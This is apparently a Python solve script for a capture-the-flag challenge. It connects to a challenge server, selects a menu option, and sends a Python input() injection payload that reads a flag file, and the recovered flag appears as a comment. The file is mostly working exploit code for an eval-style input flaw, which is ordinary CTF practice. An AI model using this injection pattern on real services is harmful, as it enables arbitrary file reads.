import socket
import sys

def connect():
    s = socket.socket()
    s.connect(("play.hexa.pro", 7878))
    s.recv(1024)
    return s

def selectMenu(s):
    s.recv(1024)
    s.send(b'3\n')
    return s.recv(1024)

def reqPayload(s):
    s.recv(1024)
    payload = 'input(open("{}", "r").read())\n'.format("/home/pyvuln1/flag.txt").encode()
    s.send(payload)
    return s.recv(1024)

sock = connect()
selectMenu(sock)
result = reqPayload(sock)
flag = result.decode()
print(flag)



#flag{wh4t_th3_w3ird_1nput}
